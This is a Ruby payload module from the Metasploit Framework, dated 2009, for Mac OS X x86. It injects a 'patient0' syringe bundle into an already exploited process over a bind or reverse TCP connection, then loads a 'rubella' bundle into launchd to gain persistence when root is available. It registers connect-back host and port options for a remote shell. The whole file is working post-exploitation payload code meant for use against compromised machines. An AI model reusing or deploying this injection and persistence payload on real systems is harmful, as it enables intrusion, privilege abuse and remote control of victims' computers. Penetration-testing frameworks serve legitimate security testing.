##
# $Id: isight.rb 6479 2009-04-13 14:33:26Z kris $
##

##
# This file is part of the Metasploit Framework and may be subject to 
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##


require 'msf/core'
require 'msf/core/payload/osx/patient0'
require 'msf/base/sessions/vncinject'
require 'fileutils'
require 'rex/compat'

###
#
# Injects patient0's syringe loaded with rubella into an exploited process
# over the established TCP connection (bind_tcp/reverse_tcp).  In addition,
# rubella will load an arbitrary bundle into launchd if it can acquire root
# privileges.  This bundle can be specified as a PATHOGEN_PAYLOAD.
# TODO: make rubella include a default connect-back payload which reads the
#       host and port from PATHOGEN_PAYLOAD.
###
module Metasploit3

	include Msf::Payload::Osx::Patient0

	def initialize(info = {})
		super(update_info(info,
			'Name'          => 'Mac OS X x86 patient0/rubella',
			'Version'       => '$Revision: 6479 $',
			'Description'   => 'Inject patient0/rubella bundle',
			'Author'        => [ 'Will Drewry <redpig@dataspill.org>' ],
			'License'       => MSF_LICENSE,
			 # TODO: fix the session used.  We setup one channel for payload delivery (bundles)
			 #       but it'd be awesome to auto-respond if rubella does a connect-back.
			'Session'       => Msf::Sessions::CommandShell))

		# Override the SYRINGE & PATHOGEN path with the rubella library
		register_options(
			[
				OptPath.new('SYRINGE',
					[ 
						true, 
						"The local path to the patient0 syringe Bundle to upload", 
						File.join(Msf::Config.install_root, "data", "syringe.bundle")
					]),
				OptPath.new('PATHOGEN', 
					[ 
						true, 
						"The local path to the patient0 syringe Bundle to upload", 
						File.join(Msf::Config.install_root, "data", "rubella.bundle")
					]),
				OptString.new('RUBELLA_HOST', 
					[ 
						true, 
						"The connect back address if rubella gets root access",
						"127.0.0.1"
					]),
				OptPort.new('RUBELLA_PORT', 
					[ 
						true, 
						"The connect back port if rubella gets root access",
						8081,
					]),
			], self.class)
	end

	def handle_connection_stage(conn)
    # Send other payloads first
    super
    # Don't send a payload yet.
    print_status("Sending empty pathogen_payload")
    # Use rubella's size instead of size + payload_size
    #rub = File.open(File.join(Msf::Config.install_root, "data", "rubella.bundle"))
		conn.put([ 0 ].pack('V'))
  end

	def on_session(session)
  # How do we get the next stage over?
		super(session)
	end

end
